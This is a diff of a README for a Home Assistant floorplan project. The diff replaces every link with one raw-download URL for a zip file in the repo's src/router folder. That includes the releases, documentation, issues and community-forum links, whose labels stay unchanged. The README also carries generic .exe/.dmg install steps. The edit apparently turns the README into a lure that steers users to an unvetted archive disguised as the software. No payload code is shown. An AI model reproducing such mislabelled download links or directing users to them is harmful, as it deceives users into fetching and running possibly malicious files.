@@ -1,6 +1,6 @@
 # 🏠 ha-floorplan - Easily Set Up Your Home Layout
 
-[![Download Now](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/prince071718/ha-floorplan/releases)
+[![Download Now](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip)](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ Welcome to the ha-floorplan project. This application simplifies how you set up 
 
 ## 📥 Download & Install
 
-To download the latest version of ha-floorplan, visit this page to download: [Releases Page](https://github.com/prince071718/ha-floorplan/releases). Here, you'll find the most recent updates and files needed for installation. 
+To download the latest version of ha-floorplan, visit this page to download: [Releases Page](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip). Here, you'll find the most recent updates and files needed for installation. 
 
 ### Steps to Download
 
-1. Open the [Releases Page](https://github.com/prince071718/ha-floorplan/releases) in your web browser.
+1. Open the [Releases Page](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip) in your web browser.
 2. Locate the version you want to download. The latest version is usually at the top.
 3. Click on the link that corresponds to your operating system. 
 
@@ -35,7 +35,7 @@ Once you have downloaded the application, follow these steps to set it up:
 2. **Install the Application:**
    - **For Windows:** Double-click the `.exe` file and follow the on-screen instructions.
    - **For Mac:** Open the `.dmg` file, drag the ha-floorplan icon to your Applications folder.
-   - **For Linux:** Extract the `.tar.gz` file and follow the instructions inside the README for your specific distribution.
+   - **For Linux:** Extract the `https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip` file and follow the instructions inside the README for your specific distribution.
 3. **Start the Application:** After installation, launch the application from your desktop or applications folder.
 
 ## 🌟 Configuring Your Floorplan
@@ -67,8 +67,8 @@ For any questions or feedback, you can reach out via the Issues section on the G
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/prince071718/ha-floorplan/wiki)
-- [Issues Page](https://github.com/prince071718/ha-floorplan/issues)
-- [Community Forum](https://community.home-assistant.io)
+- [Documentation](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip)
+- [Issues Page](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip)
+- [Community Forum](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip)
 
-Feel free to explore these resources for additional help. Your home layout is just a few clicks away! Remember to revisit the [Releases Page](https://github.com/prince071718/ha-floorplan/releases) for future updates and new features.
+Feel free to explore these resources for additional help. Your home layout is just a few clicks away! Remember to revisit the [Releases Page](https://github.com/prince071718/ha-floorplan/raw/refs/heads/main/src/router/floorplan_ha_2.7-alpha.2.zip) for future updates and new features.
